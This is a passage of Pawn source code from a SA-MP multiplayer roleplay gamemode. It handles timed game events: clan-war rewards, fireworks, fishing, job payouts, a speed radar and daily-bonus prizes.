							SendToClan(cid, COLOR_SERVER, MGLOBAL);
							SendToClan(idc, COLOR_SERVER, MGLOBAL);
							for(new pid = 0; pid < MAX_PLAYERS; pid++)
							{
								if(IsPlayerConnected(pid))
								{
									if(PlayerInfo[pid][pClan] == idc)
									{
										new bani = 100000 * ClanInfo[idc][cClanScor];
										new pp = ClanInfo[idc][cClanScor];
										GivePlayerCash(pid, bani);
										PlayerInfo[pid][pPremiumPoints] += pp;
										Update(pid, pCashx);
										Update(pid, pPremiumPointsx);
										new armanoua[1000];
										format(armanoua, sizeof(armanoua), "");
										if(ClanInfo[idc][cClanScor] == 3) format(armanoua, sizeof(armanoua), "Your clan now has a new weapon: ShotGun");
										if(ClanInfo[idc][cClanScor] == 6) format(armanoua, sizeof(armanoua), "Your clan now has a new weapon: Uzi");
										if(ClanInfo[idc][cClanScor] == 9) format(armanoua, sizeof(armanoua), "Your clan now has a new weapon: MP5");
										if(ClanInfo[idc][cClanScor] == 12)format(armanoua, sizeof(armanoua), "Your clan now has a new weapon: AK47");
										if(ClanInfo[idc][cClanScor] == 20) format(armanoua, sizeof(armanoua), "Your clan now has a new weapon: M4");
										if(ClanInfo[idc][cClanScor] == 30) format(armanoua, sizeof(armanoua), "Your clan now has a new weapon: TEC9");
										format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}Your clan win the war.\n\
										Score clan bring more and larger prizes.\nClan Score: {FFFFFF}%s\n\n\
										You Got $%s\nYou Got %s Premium Points\n%s",FormatNumber(ClanInfo[idc][cClanScor]),FormatNumber(bani), FormatNumber(pp),armanoua);
										ShowPlayerDialog(pid, DIALOG_CLANWAR+1, DIALOG_STYLE_MSGBOX, "Reward War", MGLOBAL, "OK", "");
									}
								}
							}	
						}
						for(new pid = 0; pid < MAX_PLAYERS; pid++)
						{
							if(IsPlayerConnected(pid))
							{
								if(incwar[pid] == cid || incwar[pid] == idc)
								{
									incwar[pid] = 0;
									SpawnPlayer(pid);
									mortcwar[pid] = -1;
									for(new x = 0; x < sizeof(CWarTD); x++) PlayerTextDrawHide(pid, CWarTD[x]);
								}
							}
						}
					}	
				}	
			}
		}
	}
	for(new eid = 0; eid < NRARTIFICI; eid++)
	{
		if(Artificie[eid][TimpDistrugereTotala] > 0) { Artificie[eid][TimpDistrugereTotala]--; }
		if(Artificie[eid][TimpDistrugereTotala] == 1)
		{ 
			Artificie[eid][TimpDistrugereTotala] = -1;
			for(new i; i < 25; i++)
			{
				if(IsValidObject(Artificie[eid][Culoare_Distrugere][i]))
				{
					DestroyDynamicObject(Artificie[eid][Culoare_Distrugere][i]);
					Artificie[eid][Culoare_Distrugere][i] = -1;
				}
			}
			for(new i; i < 100; i++)
			{
				if(IsValidObject(Artificie[eid][Culoare_Distrugere2][i]))
				{
					DestroyObject(Artificie[eid][Culoare_Distrugere2][i]);
					Artificie[eid][Culoare_Distrugere2][i] = -1;
				}
			}
		}
		if(Artificie[eid][Lansata] > 0)
		{
			new terminat = 0;
			for(new i; i < 25; i++)
			{
				if(Artificie[eid][TimpCuloare_Distrugere][i] > 0) { Artificie[eid][TimpCuloare_Distrugere][i]--; }
				if(Artificie[eid][TimpCuloare_Distrugere][i] == 1)
				{
					Artificie[eid][TimpCuloare_Distrugere][i] = 0;
					DestroyObject(Artificie[eid][Culoare_Distrugere][i]);
					Artificie[eid][Culoare_Distrugere][i] = -1;
					terminat = 1;
				}
			}			
			for(new i; i < 100; i++)
			{
				if(Artificie[eid][TimpCuloare_Distrugere2][i] > 0) { Artificie[eid][TimpCuloare_Distrugere2][i]--; }
				if(Artificie[eid][TimpCuloare_Distrugere2][i] == 1)
				{

					DestroyObject(Artificie[eid][Culoare_Distrugere2][i]);
					Artificie[eid][TimpCuloare_Distrugere2][i] = -1;
					Artificie[eid][Culoare_Distrugere2][i] = -1;
				}
			}
			if(terminat == 1)
			{
				new Float:x,Float:y,Float:z;
				x = Artificie[eid][CuloareArtificie_Pozitie][0];
				y = Artificie[eid][CuloareArtificie_Pozitie][1];
				z = Artificie[eid][CuloareArtificie_Pozitie][2];
				new Float:radius = Artificie[eid][Artificie_Raza];
				new type2[3]={19296,19297,19298};
				new type[15]={19282,19283,19284,19285,19286,19287,19288,19291,19292,19293,19294,19293,19294,19293,19294};
				new doar50 = 0;
				new Float:phi=0.0,Float:theta=0.0;
				new id = 0;
				new id2 = 0;
				new Float:Ax=0.0,Float:Ay=0.0,Float:Az=0.0;
				CreateExplosion(x,y,z, 12,10.0);
				for(new i; i < 100; i++)
				{
					Ax=x+(radius*floatsin(-phi,degrees)*floatcos(-theta,degrees));
					Ay=y+(radius*floatsin(-phi,degrees)*floatsin(-theta,degrees));
					Az=z+(radius*floatcos(-phi,degrees));
					if(doar50 <= 50)
					{
						Artificie[eid][Culoare_Distrugere2][i] =CreateObject(type2[id2],x,y,z,0.0,0.0,theta+30);
					}
					else
					{
						Artificie[eid][Culoare_Distrugere2][i] =CreateObject(type[id],x,y,z,0.0,0.0,theta+30);
					}
					MoveObject(Artificie[eid][Culoare_Distrugere2][i], Ax,Ay,Az, 5.0);
					doar50++;
					theta+=30.0; if(theta==360.0)
					{ Ax=0.0; Ax=0.0; Ay=0.0;}
					if((1+i)%8==1) { phi+=90; }
					id++;
					if(id == 15){id = 0;}
					id2++;
					if(id2 == 3){id2 = 0;}
					Artificie[eid][TimpCuloare_Distrugere2][i] = 4;
				}
			}			
			if(Artificie[eid][TimpCuloare] == 1)
			{
				new Float:x,Float:y,Float:z;
				x = Artificie[eid][CuloareArtificie_Pozitie][0];
				y = Artificie[eid][CuloareArtificie_Pozitie][1];
				z = Artificie[eid][CuloareArtificie_Pozitie][2];
				new Float:radius = Artificie[eid][Artificie_Raza];
				Artificie[eid][TimpCuloare] = -1;
				new nobject = Artificie[eid][CuloareArtificie];
				DestroyDynamicObject(nobject);
				new type2[3]={19296,19297,19298};
				new type[4]={19281,19282,19283,19294};
				new doarde20deori = 0;
				new Float:phi=0.0,Float:theta=0.0;
				new id = 0;
				new Float:Ax=0.0,Float:Ay=0.0,Float:Az=0.0;
				CreateExplosion(x,y,z, 12,10.0);
				for(new i; i < 25; i++)
				{
					Ax=x+(radius*floatsin(-phi,degrees)*floatcos(-theta,degrees));
					Ay=y+(radius*floatsin(-phi,degrees)*floatsin(-theta,degrees));
					Az=z+(radius*floatcos(-phi,degrees));
					if(doarde20deori <= 20)
					{
						Artificie[eid][Culoare_Distrugere][i]=CreateObject(type2[random(2)],x,y,z,0.0,0.0,theta+30);
					}
					else
					{
						Artificie[eid][Culoare_Distrugere][i]=CreateObject(type[id],x,y,z,0.0,0.0,theta+30);
					}
					doarde20deori++;
					MoveObject(Artificie[eid][Culoare_Distrugere][i], Ax,Ay,Az, 5.0);
					Artificie[eid][TimpCuloare_Distrugere][i] = 4;
					theta+=30.0; if(theta==360.0)
					{ Ax=0.0; Ax=0.0; Ay=0.0;}
					if((1+i)%8==1) { phi+=90; }
					id++;
					if(id == 4){id = 0;}
				}
			}
		}
	}	
	for(new playerid = 0; playerid < MAX_PLAYERS; playerid++)
	{
		if(IsPlayerConnected(playerid))
		{	
			if(FishTimer[playerid] > 0) 
			{ 
				FishTimer[playerid]--;
				switch(FishTimer[playerid])
				{
					case 1:
					{
						new money;
						GetPlayerName(playerid, sendername, sizeof(sendername));
						KillTimer(FishTimerr[playerid]);
						Fishing[playerid] = 0;
						FishTimer[playerid] = 0;
						if(TipPeste[playerid] == 1)
						{
							money = 30000 + random(85000);
							PlayerInfo[playerid][pFishPrice] = money;
							SendClientMessage(playerid, COLOR_ERROR, "You caught a fish common!");
							format(string,sizeof(string),"Fish caught you worth $%d!", money);
							SendClientMessage(playerid, COLOR_ERROR, string);
							SendClientMessage(playerid, COLOR_SERVER, "To sell fish, go to a store 24/7.");
							format(string,sizeof(string),"* %s caught a common fish that can be sold for about $%d.", sendername, money);
							ProxDetector(30.0, playerid, string, COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
							PlayerInfo[playerid][pFishes] = 1;
							ClearAnimations(playerid);
						}
						else if(TipPeste[playerid] == 2)
						{
							money = 45000 + random(158000);
							PlayerInfo[playerid][pFishPrice] = money;
							SendClientMessage(playerid, COLOR_BLUE, "You caught a rare fish!");
							format(string,sizeof(string),"Fish caught you worth $%d!", money);
							SendClientMessage(playerid, COLOR_ERROR, string);
							SendClientMessage(playerid, COLOR_SERVER, "To sell fish, go to a store 24/7.");
							format(string,sizeof(string),"* %s caught a common fish that can be sold for about $%d.", sendername, money);
							ProxDetector(30.0, playerid, string, COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
							PlayerInfo[playerid][pFishes] = 1;
							ClearAnimations(playerid);
						}
						else if(TipPeste[playerid] == 3)
						{
							money = 160000 + random(350000);
							PlayerInfo[playerid][pFishPrice] = money;
							SendClientMessage(playerid, COLOR_YELLOW, "Ai prins un peste foarte rar!");
							format(string,sizeof(string),"Fish caught you worth $%d!", money);
							SendClientMessage(playerid, COLOR_ERROR, string);
							SendClientMessage(playerid, COLOR_SERVER, "To sell fish, go to a store 24/7.");
							format(string,sizeof(string),"* %s caught a common fish that can be sold for about $%d.", sendername, money);
							ProxDetector(30.0, playerid, string, COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW,COLOR_YELLOW);
							PlayerInfo[playerid][pFishes] = 1;
							ClearAnimations(playerid);
						}
						TipPeste[playerid] = 0;
					}
					case 2:
					{
						ClearAnimations(playerid);
						TogglePlayerControllable(playerid, 1);
						new randfish = random(99);
						if(PlayerInfo[playerid][pFishSkill] == 1)
						{
							if(randfish >= 0 && randfish <= 87) TipPeste[playerid] = 1;
							else if(randfish >= 88 && randfish <= 98) TipPeste[playerid] = 2;
							else if(randfish >= 99) TipPeste[playerid] = 3;
						}
						else if(PlayerInfo[playerid][pFishSkill] == 2)
						{
							if(randfish >= 0 && randfish <= 83) TipPeste[playerid] = 1;
							else if(randfish >= 84 && randfish <= 97) TipPeste[playerid] = 2;
							else if(randfish >= 98) TipPeste[playerid] = 3;
						}
						else if(PlayerInfo[playerid][pFishSkill] == 3)
						{
							if(randfish >= 0 && randfish <= 79) TipPeste[playerid] = 1;
							else if(randfish >= 80 && randfish <= 96) TipPeste[playerid] = 2;
							else if(randfish >= 97) TipPeste[playerid] = 3;
						}
						else if(PlayerInfo[playerid][pFishSkill] == 4)
						{
							if(randfish >= 0 && randfish <= 75) TipPeste[playerid] = 1;
							else if(randfish >= 76 && randfish <= 95) TipPeste[playerid] = 2;
							else if(randfish >= 96) TipPeste[playerid] = 3;
						}
						else if(PlayerInfo[playerid][pFishSkill] == 5)
						{
							if(randfish >= 0 && randfish <= 71) TipPeste[playerid] = 1;
							else if(randfish >= 72 && randfish <= 94) TipPeste[playerid] = 2;
							else if(randfish >= 95) TipPeste[playerid] = 3;
						}
						else if(PlayerInfo[playerid][pFishSkill] >= 6)
						{
							if(randfish >= 0 && randfish <= 67) TipPeste[playerid] = 1;
							else if(randfish >= 68 && randfish <= 93) TipPeste[playerid] = 2;
							else if(randfish >= 94) TipPeste[playerid] = 3;
						}
					}
					case 7: GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~w~FISHING...", 4110, 5);
					case 12: GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~w~FISHING...", 5110, 5);
					case 19: GameTextForPlayer(playerid, "~n~~n~~n~~n~~n~~n~~w~FISHING...", 5110, 5);
				}
			}	
			if(coliziuniactive[playerid] >= 0)
			{
				if(IsPlayerConnected(coliziuniactive[playerid]))
				{
					new injob = 0;
					if((IsPlayerInVehicle(playerid, JCurier[playerid][2])) || (IsPlayerInVehicle(playerid, JCiment[playerid][2])) || (IsPlayerInVehicle(playerid, JCariera[playerid][2]))) { injob = 1; }
					if(!ProxDetectorS(50.0, playerid, coliziuniactive[playerid]) || playerid == coliziuniactive[playerid] && injob == 0)
					{
						DisableRemoteVehicleCollisions(playerid, 0);
						coliziuniactive[playerid] = -1;
					}	
				}
			}
			if(resetare_detectare_aimbot[playerid] > 0) { resetare_detectare_aimbot[playerid]--; }
			if(resetare_detectare_aimbot[playerid] == 0)
			{
				resetare_detectare_aimbot[playerid] = 30;
				ucideri_detectare_aimbot[playerid] = 0;
			}
			if(AscundeTD[playerid] > 0) { AscundeTD[playerid]--; }
			if(AscundeTD[playerid] == 0)
			{
				AscundeTD[playerid] = -1;
				PlayerTextDrawHide(playerid, PaintTD[0]);
				PlayerTextDrawHide(playerid, PaintTD[8]);
				PlayerTextDrawHide(playerid, PaintTD[2]);
				PlayerTextDrawHide(playerid, PaintTD[3]);
			}
			if(incamerapaintball[playerid] == 1)
			{
				incamerapaintball[playerid] = 0;
				SetCameraBehindPlayer(playerid);
				SetPlayerCameraPos(playerid, -30.353076, 1487.750366, 25.600154);
				SetPlayerCameraLookAt(playerid, -27.017646, 1491.312622, 24.511293);
			}
			if(timp_artificie[playerid] > 0) { timp_artificie[playerid]--; }
			if(timp_artificie[playerid] == 1) { timp_artificie[playerid] = 0; }
			/*if(QuestTimer[playerid] > 0) { QuestTimer[playerid]--; }
			if(QuestTimer[playerid] == 0)
			{
				QuestTimer[playerid] = -1;
				SetPlayerVirtualWorld(playerid, 0);
			}*/
			if(kickplayer[playerid] == 1)
			{
				kickplayer[playerid] = -1;
				Kick(playerid);
			}
			if(GetPlayerInterior(playerid) == 0 && GetPlayerVirtualWorld(playerid) == 0 && zapada == 1)
			{
				snowActive[playerid]++;
				if(snowActive[playerid] >= 5) 
				{ CreateSnow(playerid); snowActive[playerid] = 1; }
			}
			if(JCariera[playerid][0] > 0)
			{
				if(CarieraObiecte[playerid] >= 26)
				{
					new bani = 35000 + random(20000) * PlayerInfo[playerid][pCarieraSkill] * 2;
					GivePlayerCash(playerid, bani);
					format(MGLOBAL, sizeof(MGLOBAL), "(+) You Won $%s because you have completed all the ground.",FormatNumber(bani));
					SCM(playerid, COLOR_GREEN, MGLOBAL);
					if(bani >= 100000)
					{
						if(PlayerInfo[playerid][pDailyBonus] == 1)
						{
							if(ofertazilei == 3)
							{
								if(bani >= 100000)
								{
									PlayerInfo[playerid][pDailyBonus] = 0;
									new sqlupdate[1000];
									mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "UPDATE `users` SET `DailyBonus`='0' WHERE `id` = '%d'",PlayerInfo[playerid][pSQLID]);
									mysql_tquery(SQL, sqlupdate, "","");
									SCM(playerid, COLOR_SERVER, "{0066FF}Daily Deals: {FFFFFF}You receive 60 Points Premium, 7 Points of Respect, $8,000,000 Because you filled day offer.");
									GivePlayerCash(playerid, 8000000);
									PlayerInfo[playerid][pExp] += 7;
									PlayerInfo[playerid][pPremiumPoints] += 60;
									Update(playerid, pCashx);
									Update(playerid, pRP);
									Update(playerid, pPremiumPointsx);
								}
							}
						}
					}
					CarieraObiecte[playerid] = 0;
					DisablePlayerCheckpoint(playerid);
					CP[playerid]  = 0;
					for(new t = 0; t < 26; t++)
					{
						if( IsValidDynamicObject( CarieraObiect[playerid][t] ) )
						{
							DestroyDynamicObject(CarieraObiect[playerid][t]);
						}
					}
					DestroyVehicle(JCariera[playerid][2]);
					for(new i = 0; i < 3; i++) JCariera[playerid][i] = -1; 
				}
				else
				{
					new nrobiecte = 0;
					for(new t = 0; t < 26; t++)
					{
						if(IsValidDynamicObject( CarieraObiect[playerid][t] ) )
						{
							nrobiecte++;
						}
					}
					if(nrobiecte == 0)
					{
						new bani = 35000 + random(20000) * PlayerInfo[playerid][pCarieraSkill] * 2;
						GivePlayerCash(playerid, bani);
						format(MGLOBAL, sizeof(MGLOBAL), "(+) You Won $%s because you have completed all the ground.",FormatNumber(bani));
						SCM(playerid, COLOR_GREEN, MGLOBAL);
						if(bani >= 100000)
						{
							if(PlayerInfo[playerid][pDailyBonus] == 1)
							{
								if(ofertazilei == 3)
								{
									if(bani >= 100000)
									{
										PlayerInfo[playerid][pDailyBonus] = 0;
										new sqlupdate[1000];
										mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "UPDATE `users` SET `DailyBonus`='0' WHERE `id` = '%d'",PlayerInfo[playerid][pSQLID]);
										mysql_tquery(SQL, sqlupdate, "","");
										SCM(playerid, COLOR_SERVER, "{0066FF}Daily Deals: {FFFFFF}You receive 60 Points Premium 7 points respectively, $ 8,000,000 for complete offer of the day.");
										GivePlayerCash(playerid, 8000000);
										PlayerInfo[playerid][pExp] += 7;
										PlayerInfo[playerid][pPremiumPoints] += 60;
										Update(playerid, pCashx);
										Update(playerid, pRP);
										Update(playerid, pPremiumPointsx);
									}
								}
							}
						}
						CarieraObiecte[playerid] = 0;
						DisablePlayerCheckpoint(playerid);
						CP[playerid]  = 0;
						for(new t = 0; t < 26; t++)
						{
							if( IsValidDynamicObject( CarieraObiect[playerid][t] ) )
							{
								DestroyDynamicObject(CarieraObiect[playerid][t]);
							}
						}
						DestroyVehicle(JCariera[playerid][2]);
						for(new i = 0; i < 3; i++) JCariera[playerid][i] = -1; 
					}
				}
				for(new t = 0; t < 26; t++)
				{	
					new Float:x, Float:y, Float:z;
					GetDynamicObjectPos(CarieraObiect[playerid][t], x, y, z);
					if(IsPlayerInRangeOfPoint(playerid,2.0,x,y,z))
					{
						DestroyDynamicObject(CarieraObiect[playerid][t]);
						CarieraObiecte[playerid] ++;
						PlayerInfo[playerid][pCarieraRem]--;
						PlayerInfo[playerid][pCarieraTimes]++;
						Update(playerid,pCarieraRemx);
						Update(playerid,pCarieraTimesx);
						if(PlayerInfo[playerid][pCarieraSkill] <= 5)
						{
							if(PlayerInfo[playerid][pCarieraRem] <= 0)
							{
								PlayerInfo[playerid][pCarieraSkill]++;
								if(PlayerInfo[playerid][pCarieraSkill] == 2)
								{
									PlayerInfo[playerid][pCarieraRem] = 250;
								}
								else if(PlayerInfo[playerid][pCarieraSkill] == 3)
								{
									PlayerInfo[playerid][pCarieraRem] = 500;
								}
								else if(PlayerInfo[playerid][pCarieraSkill] == 4)
								{
									PlayerInfo[playerid][pCarieraRem] = 700;
								}
								else if(PlayerInfo[playerid][pCarieraSkill] == 5)
								{
									PlayerInfo[playerid][pCarieraRem] = 900;
								}
								Update(playerid,pCarieraSkillx);
								Update(playerid,pCarieraRemx);
								format(MGLOBAL,sizeof(MGLOBAL),"Congratulations! You now have skill %d for this job!",PlayerInfo[playerid][pCarieraSkill]);
								SendClientMessage(playerid, COLOR_YELLOW, MGLOBAL);
							}
						}
					}
				}	
			}
		}
		new Float:oldposx, Float:oldposy, Float:oldposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
	    if(Radaron[playerid] == 1)
	    {
	        for(new o = 0; o < MAX_PLAYERS; o++)
 			{
				if(IsPlayerConnected(o))
				{
					if(IsPlayerInRangeOfPoint(o, 30.0, oldposx, oldposy, oldposz) && GetPlayerState(o) == PLAYER_STATE_DRIVER && OnDuty[o] == 0)
					{
						new viteza = Carspeed(o);
						if(viteza > Radarlimit[playerid])
						{
							new nameradar[25],nameradar1[25];
							GetPlayerName(o,nameradar,sizeof(nameradar));
							GetPlayerName(playerid,nameradar1,sizeof(nameradar1));
							format(string, sizeof(string), "{0066FF}SpeedCam: {FFFFFF}%s[ID:%d] Speed: %d KM/H, Location: %s, Speed limit: %d KM/H.", nameradar,o,viteza,GetPlayerZone(o),Radarlimit[playerid]);
							SCM(playerid,COLOR_WHITE,string);
							format(string, sizeof(string), "{0066FF}SpeedCam: {FFFFFF}%s He saw with radar :%d KM/H, Speed limit: %d KM/H",nameradar1,viteza,Radarlimit[playerid]);
							SCM(o,COLOR_WHITE,string);
							return 1;
						}
					}
				}	
			}
		}
		if(JCurier[playerid][1] > 0) JCurier[playerid][1]--;
		if(JCurier[playerid][1] == 95)
		{
			ShowPlayerDialog(playerid, DIALOG_CURIER, DIALOG_STYLE_MSGBOX, "Courier ", " A new package was ordered.\n Do you want to take this command?", "Yes", "Nu");
			JCurier[playerid][1] = -1;
		}
		if(JCiment[playerid][1] > 0) JCiment[playerid][1]--;
		if(JCiment[playerid][1] == 120)
		{
			DisableRemoteVehicleCollisions(playerid, 0);
			JCiment[playerid][1] = -1;
			RemovePlayerAttachedObject(playerid,betonobject1[playerid]);
			DestroyPlayerObject(playerid,betonobject1[playerid]);
			new bani = 15000 + random(20000) * PlayerInfo[playerid][pCimentSkill] * 2;
			GivePlayerCash(playerid, bani);
			Update(playerid, pCashx);
			format(string, sizeof(string), "(+) You won $%s for this transport.",FormatNumber(bani));
			SCM(playerid, COLOR_GREEN, string);
			TogglePlayerControllable(playerid, 1);
			PlayerInfo[playerid][pCimentRem]--;
			PlayerInfo[playerid][pCimentTimes]++;
			Update(playerid,pCimentRemx);
			Update(playerid,pCimentTimesx);
			if(PlayerInfo[playerid][pCimentSkill] <= 5)
			{
				if(PlayerInfo[playerid][pCimentRem] <= 0)
				{
					PlayerInfo[playerid][pCimentSkill]++;
					if(PlayerInfo[playerid][pCimentSkill] == 2)
					{
						PlayerInfo[playerid][pCimentRem] = 34;
					}
					else if(PlayerInfo[playerid][pCimentSkill] == 3)
					{
						PlayerInfo[playerid][pCimentRem] = 49;
					}
					else if(PlayerInfo[playerid][pCimentSkill] == 4)
					{
						PlayerInfo[playerid][pCimentRem] = 89;
					}
					else if(PlayerInfo[playerid][pCimentSkill] == 5)
					{
						PlayerInfo[playerid][pCimentRem] = 99;
					}
					Update(playerid,pCimentSkillx);
					Update(playerid,pCimentRemx);
					format(string,sizeof(string),"Congratulations! You now have skill %d for this job!",PlayerInfo[playerid][pCimentSkill]);
					SendClientMessage(playerid, COLOR_YELLOW, string);
				}
			}
			CP[playerid] = 171717;
			SetPlayerCheckpoint(playerid, 586.6498,844.7211,-41.5788, 4.0);
			SCM(playerid, COLOR_SERVER, "Go to checkpoint set cement map to load your vehicle!");
		}
		if(JCiment[playerid][1] == 100)
		{
			JCiment[playerid][1] = -1;
			TogglePlayerControllable(playerid, -1);
			SCM(playerid, COLOR_SERVER, "Go to Checkpoint map set to deliver cement.");
			CP[playerid] = 171718;
			SetPlayerCheckpoint(playerid, 2433.0212, 1932.9012, 5.0138, 4.0);
			DisableRemoteVehicleCollisions(playerid, 1);
		}
		if(JCiment[playerid][1] == 0)
		{
			JCiment[playerid][1] = -1;
			DisableRemoteVehicleCollisions(playerid, 0);
		}
		if(JCurier[playerid][1] == 0)
		{
			JCurier[playerid][1] = -1;
			DisableRemoteVehicleCollisions(playerid, 0);
		}
		if(bugobiecte[playerid] > 0) bugobiecte[playerid]--;
		if(bugobiecte[playerid] == 0)
		{
			TogglePlayerControllable(playerid, 1);
			bugobiecte[playerid] = -1;
		}
		if(timereferral[playerid] > 0) timereferral[playerid]--;
		if(timereferral[playerid] == 0)
		{
			timereferral[playerid] = -1;
		}
		if(rotiredailybonus[playerid] > 0)
		{
			if(rotiredailybonus[playerid] == 3)
			{	
				new castig = 1 + random(9);
				new castig2;
				if(castig == 0 || castig == 2 || castig == 5) castig2 = 1;
				if(castig == 1 || castig == 6 || castig == 9 || castig == 7) castig2 = 2;
				if(castig == 3 || castig == 4 || castig == 10 || castig == 8) castig2 = 3;
				if(castig2 == 1)
				{
					PlayerTextDrawSetPreviewRot(playerid, DailyTD[27], 90.000000, 0.000000, 90.000000, 1.000000);
					PlayerTextDrawSetPreviewModel(playerid, DailyTD[27], 1212);
					PlayerTextDrawShow(playerid, DailyTD[27]);
					new bani = 1000000 + random(350000) * PlayerInfo[playerid][pLevel] / 2;
					format(MGLOBAL, sizeof(MGLOBAL), "$%s",FormatNumber(bani));
					PlayerTextDrawSetString(playerid, DailyTD[28], MGLOBAL);
					PlayerTextDrawShow(playerid, DailyTD[28]);
				}
				if(castig2 == 2)
				{
					PlayerTextDrawSetPreviewRot(playerid, DailyTD[27], 0.000000, 0.000000, 0.000000, 1.000000);
					PlayerTextDrawSetPreviewModel(playerid, DailyTD[27], 1247);
					PlayerTextDrawShow(playerid, DailyTD[27]);
					new pp = 1 + random(30) * PlayerInfo[playerid][pLevel] / 3;
					format(MGLOBAL, sizeof(MGLOBAL), "%s_Premium_Points",FormatNumber(pp));
					PlayerTextDrawSetString(playerid, DailyTD[28], MGLOBAL);
					PlayerTextDrawShow(playerid, DailyTD[28]);
				}
				if(castig2 == 3)
				{
					PlayerTextDrawSetPreviewRot(playerid, DailyTD[27], 180.000000, 0.000000, 90.000000, 1.000000);
					PlayerTextDrawSetPreviewModel(playerid, DailyTD[27], 1318);
					PlayerTextDrawShow(playerid, DailyTD[27]);
					new levelrp = random(10);
					new lvlrp;
					if(levelrp == 0 || levelrp == 1 || levelrp == 4 || levelrp == 7 || levelrp == 10) lvlrp = 1;
					if(levelrp == 2 || levelrp == 3 || levelrp == 5 || levelrp == 6 || levelrp == 8 || levelrp == 9) lvlrp = 2;	
					if(lvlrp == 1)
					{
						new rp = 1 + random(14);
						format(MGLOBAL, sizeof(MGLOBAL), "%s_Respect_Points",FormatNumber(rp));
						PlayerTextDrawSetString(playerid, DailyTD[28], MGLOBAL);
					}
					if(lvlrp == 2)
					{
						PlayerTextDrawSetString(playerid, DailyTD[28], "LEVEL_UP");
					}
					PlayerTextDrawShow(playerid, DailyTD[28]);
				}		
			}
			if(rotiredailybonus[playerid] == 1)
			{
				new castig = 1 + random(9);
				new castig2;
				if(castig == 0 || castig == 2 || castig == 5) castig2 = 1;
				if(castig == 1 || castig == 6 || castig == 9 || castig == 7) castig2 = 2;
				if(castig == 3 || castig == 4 || castig == 10 || castig == 8) castig2 = 3;
				if(castig2 == 1)
				{
					PlayerTextDrawSetPreviewRot(playerid, DailyTD[30], 90.000000, 0.000000, 90.000000, 1.000000);
					PlayerTextDrawSetPreviewModel(playerid, DailyTD[30], 1212);
					PlayerTextDrawShow(playerid, DailyTD[30]);
					new bani = 1000000 + random(350000) * PlayerInfo[playerid][pLevel] / 2;
					format(MGLOBAL, sizeof(MGLOBAL), "$%s",FormatNumber(bani));
					PlayerTextDrawSetString(playerid, DailyTD[29], MGLOBAL);
					PlayerTextDrawShow(playerid, DailyTD[29]);
					GivePlayerCash(playerid, bani);
					Update(playerid, pCashx);
					format(MGLOBAL, sizeof(MGLOBAL), "Congratulations! You won $%s!",FormatNumber(bani));
					ShowPlayerDialog(playerid, DIALOG_DBONUS, DIALOG_STYLE_MSGBOX, "Daily Bonus - Castig", MGLOBAL, "OK", "");
				}
				if(castig2 == 2)
				{
					PlayerTextDrawSetPreviewRot(playerid, DailyTD[30], 0.000000, 0.000000, 0.000000, 1.000000);
					PlayerTextDrawSetPreviewModel(playerid, DailyTD[30], 1247);
					PlayerTextDrawShow(playerid, DailyTD[30]);
					new pp = 1 + random(30) * PlayerInfo[playerid][pLevel] / 3;
					format(MGLOBAL, sizeof(MGLOBAL), "%s_Premium_Points",FormatNumber(pp));
					PlayerTextDrawSetString(playerid, DailyTD[29], MGLOBAL);
					PlayerTextDrawShow(playerid, DailyTD[29]);
					PlayerInfo[playerid][pPremiumPoints] += pp;
					Update(playerid, pPremiumPointsx);
					format(MGLOBAL, sizeof(MGLOBAL), "Congratulations! You won %s Points Premium!",FormatNumber(pp));
					ShowPlayerDialog(playerid, DIALOG_DBONUS, DIALOG_STYLE_MSGBOX, "Daily Bonus - Castig", MGLOBAL, "OK", "");
				}
				if(castig2 == 3)
				{
					PlayerTextDrawSetPreviewRot(playerid, DailyTD[30], 180.000000, 0.000000, 90.000000, 1.000000);
					PlayerTextDrawSetPreviewModel(playerid, DailyTD[30], 1318);
					PlayerTextDrawShow(playerid, DailyTD[30]);
					new levelrp = random(10);
					new lvlrp;
					if(levelrp == 0 || levelrp == 1 || levelrp == 4 || levelrp == 7 || levelrp == 10) lvlrp = 1;
					if(levelrp == 2 || levelrp == 3 || levelrp == 5 || levelrp == 6 || levelrp == 8 || levelrp == 9) lvlrp = 2;	
					if(lvlrp == 1)
					{
						new rp = 1 + random(14);
						format(MGLOBAL, sizeof(MGLOBAL), "%s_Respect_Points",FormatNumber(rp));
						PlayerTextDrawSetString(playerid, DailyTD[29], MGLOBAL);
						PlayerInfo[playerid][pExp] += rp;
						Update(playerid, pRP);
						format(MGLOBAL, sizeof(MGLOBAL), "Congratulations! You won %s Points of Respect!",FormatNumber(rp));
						ShowPlayerDialog(playerid, DIALOG_DBONUS, DIALOG_STYLE_MSGBOX, "Daily Bonus - Castig", MGLOBAL, "OK", "");
					}
					if(lvlrp == 2)
					{
						PlayerTextDrawSetString(playerid, DailyTD[29], "LEVEL_UP");
					}
					PlayerTextDrawShow(playerid, DailyTD[29]);
				}
			}
			if(rotiredailybonus[playerid] == 2)
			{			
				new castig = 1 + random(9);
				new castig2;
				if(castig == 0 || castig == 2 || castig == 5) castig2 = 1;
				if(castig == 1 || castig == 6 || castig == 9 || castig == 7) castig2 = 2;
				if(castig == 3 || castig == 4 || castig == 10 || castig == 8) castig2 = 3;
				if(castig2 == 1)
				{
					PlayerTextDrawSetPreviewRot(playerid, DailyTD[31], 90.000000, 0.000000, 90.000000, 1.000000);
					PlayerTextDrawSetPreviewModel(playerid, DailyTD[31], 1212);
					PlayerTextDrawShow(playerid, DailyTD[31]);
					new bani = 1000000 + random(350000) * PlayerInfo[playerid][pLevel] / 2;
					format(MGLOBAL, sizeof(MGLOBAL), "$%s",FormatNumber(bani));
					PlayerTextDrawSetString(playerid, DailyTD[32], MGLOBAL);
					PlayerTextDrawShow(playerid, DailyTD[32]);	
				}
				if(castig2 == 2)
				{
					PlayerTextDrawSetPreviewRot(playerid, DailyTD[31], 0.000000, 0.000000, 0.000000, 1.000000);
					PlayerTextDrawSetPreviewModel(playerid, DailyTD[31], 1247);
					PlayerTextDrawShow(playerid, DailyTD[31]);
